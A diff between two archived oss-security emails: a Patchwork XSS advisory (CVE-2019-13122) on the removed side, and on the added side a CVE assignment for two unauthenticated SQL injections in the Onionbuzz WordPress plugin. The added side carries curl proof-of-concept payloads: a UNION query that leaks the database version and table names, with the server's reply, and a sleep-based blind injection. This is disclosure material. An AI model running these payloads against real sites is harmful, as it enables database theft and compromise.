@@ -1,38 +1,74 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/07/05/1
-Message-ID: <8736jl0z7b.fsf@dja-thinkpad.axtens.net>
-Date: Fri, 05 Jul 2019 16:31:36 +1000
-From: Daniel Axtens <dja@...ens.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/07/23/1
+Message-ID: <CAN1YN0tUvJ4mE1WHDBeS_=BRt3M1iZ8p95hP8-3OU=_KgZrF3g@mail.gmail.com>
+Date: Mon, 22 Jul 2019 23:04:25 -0400
+From: Eugene Kolo <eugene@...enekolo.com>
 To: oss-security@...ts.openwall.com
-Cc: Andrew Donnellan <ajd@...ux.ibm.com>
-Subject: CVE-2019-13122: Patchwork: XSS via Message-ID 
+Subject: Re: Two unauthenticated SQL injection vulnerabilities in Onionbuzz WordPress plugin
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+Assigned CVE-2019-14230 and CVE-2019-14231.
 
-Patchwork is a web-based patch tracking system designed to facilitate
-the contribution and management of contributions to an open-source
-project that uses a mailing list for contributions.
-(http://jk.ozlabs.org/projects/patchwork/)
+On Sat, Jul 20, 2019 at 6:35 PM Eugene Kolo <eugene@...enekolo.com> wrote:
 
-Andrew Donnellan discovered an XSS via the message-id field. A malicious
-party could send a patch with a message ID that included a script
-tag. Because of the quirks of the email RFCs, such a message ID can
-survive being sent through many mail systems, including Gmail, and be
-parsed and stored by Patchwork. When a user views a patch detail page
-for the patch with this message id, the script would be run.
+> Two unauthenticated/unprivileged SQL injection vulnerabilities in the
+> Viral Quiz Maker - Onionbuzz WordPress plugin.
+>
+> Information
+> ===========
+> Affected Product: Viral Quiz Maker - OnionBuzz WordPress plugin
+> Vendor Homepage: Onionbuzz.com
+> Vulnerability Type: SQL Injection
+> Discoverer: Eugene Kolodenker
+> Date: July-20-2019
+>
+> 1)
+>
+> Description
+> ===========
+> Prior to v1.2.2, you could exploit the `points` parameter in the
+> `ob_get_results` ajax nopriv handler due to there being no sanitization on
+> the points argument. The points parameter is not sanitized prior to be used
+> in a SQL query in getResultByPointsTrivia. This allows an
+> unauthenticated/unprivileged user to perform a SQL injection attack capable
+> of remote code execution and information disclosure.
+>
+> Proof of Concept (POC)
+> ======================
+> ```
+> curl http://site/wp-admin/admin-ajax.php?action=ob_get_results --data
+> "type=get_result&id=1&quiz_type=5&points=1 or 1=0 union all select
+> 1,1,version(),table_name,1,1,1,1,1 from information_schema.tables;#"
+> ```
+>
+> And get back:
+> ```
+> {"quiz_id":1,"points":"1 or 1=0 union all select
+> 1,1,version(),table_name,1,1,1,1,1 from
+> information_schema.tables;#","title":<DBVERSION>","description":"CHARACTER_SETS","featured_image":"<img
+> src=\"1\">","image_caption":"1","is_image":1,"success":1}
+> ```
+>
+>
+> 2)
+>
+> Description
+> ===========
+> Prior to v1.2.7, you could exploit the `id` parameter in the `set_count`
+> ajax nopriv handler due to there being no sanitization on the id argument.
+> The id parameter is not sanitized prior to be used in a SQL query in
+> saveQuestionVote. This allows an unauthenticated/unprivileged user to
+> perform a SQL injection attack capable of remote code execution and
+> information disclosure.
+>
+>
+> Proof of Concept (POC)
+> ======================
+>
+> ```
+> curl http://site/wp-admin/admin-ajax.php?type=set_count --data
+> "action=ob_question_votes&id=1 or sleep(10);#"
+> ```
+>
+>
 
-This is due to an erroneous mark_safe() in the template tag that
-renders message IDs. This has been present since v1.1 of upstream
-Patchwork, but does not affect the FreeDesktop fork.
-
-Over the last few days, we have disclosed this bug to the admins of
-patchwork instances that we could identify. Several key instances have
-already been patched.
-
-The vulnerability is fixed in Patchwork v2.1.4 and v2.0.4, which have
-just been released.
-
-Kind regards,
-Daniel Axtens
-Patchwork maintainer
